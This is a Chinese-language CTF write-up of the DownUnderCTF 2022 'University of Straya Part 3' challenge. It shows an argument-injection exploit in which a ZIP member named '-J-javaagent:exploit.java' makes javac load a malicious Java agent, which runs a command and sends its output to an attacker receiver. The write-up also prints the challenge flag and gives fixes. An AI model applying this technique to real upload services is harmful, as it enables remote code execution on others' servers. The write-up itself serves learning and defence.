# DownUnderCTF 2022 University of Straya Part 3 Writeup

## 题目简述

第三题继续使用管理员权限和 Part 2 泄露的源码，要求在服务器执行 `getfinalflag`。隐藏的 `java-underdevelopment` 作业类型会把 ZIP 中所有扩展名为 `.java` 的路径直接追加到 `javac` 参数列表。虽然使用 `subprocess.run([...])` 避免了 shell 注入，文件名仍可注入 `javac -J` 参数并加载恶意 Java Agent。

## 解题过程

关键代码为：

```python
class_files = list_files(folder, allowed_ext='.java')
subprocess.run(['/usr/bin/javac', '-d', temp_output] + class_files)
```

`javac` 的 `-J<option>` 会把后面的选项传给启动编译器的 JVM。JVM 的 `-javaagent:<jar>` 选项会在 Java 主程序运行前加载指定 JAR，并调用 manifest 中 `Premain-Class` 的 `premain` 方法。因此需要准备一个 Java Agent，其核心逻辑执行目标命令并把输出发送到自己控制的接收端：

```java
public static void premain(String args) throws Exception {
    Process p = Runtime.getRuntime().exec("getfinalflag");
    byte[] output = p.getInputStream().readAllBytes();
    // 将 Base64.getEncoder().encodeToString(output) POST 到接收端
}
```

构建 JAR 时 manifest 至少包含：

```text
Manifest-Version: 1.0
Premain-Class: src.Agent
```

上传过滤只接受 `.java` 文件名，所以把编译好的 Agent JAR 重命名为 `exploit.java`。ZIP 中再加入一个零字节成员，其文件名必须精确为：

```text
-J-javaagent:exploit.java
```

解压后这两个名字都会通过 `.java` 扩展名检查，最终命令参数近似为：

```text
/usr/bin/javac -d /tmp/java/<random> exploit.java -J-javaagent:exploit.java
```

ZIP 可用支持冒号文件名的环境生成；题目仓库附带的 `exploit.zip` 也保留了该名称。即使 `exploit.java` 实际是 JAR、编译随后失败，JVM 也会先加载 agent 并执行 `premain`。源码还错误地把 `CompletedProcess` 直接与整数 0 比较，所以接口通常会报告校验失败，但这不影响已经发生的代码执行。

创建 `java-underdevelopment` 类型 assessment 并提交 ZIP 后，接收端得到 `getfinalflag` 输出的 Base64 文本。解码后为：

```text
DUCTF{d15_1s_s0m3_gTf0B1N5_m4T3r1aL!1!}
```

## 方法总结

列表形式的 `subprocess.run` 只阻止 shell 元字符解释，并不阻止被调用程序自己的参数注入。这里文件名落入 `javac` argv，`-J-javaagent:` 又把控制继续传给 JVM，形成“ZIP 文件名 → javac 参数 → JVM agent → RCE”的多级解释链。修复应拒绝以 `-` 开头的成员名、把上传文件重命名为服务端生成的安全名称，并在可能时用 `--` 终止选项解析；对归档成员还应做统一的路径与类型校验。
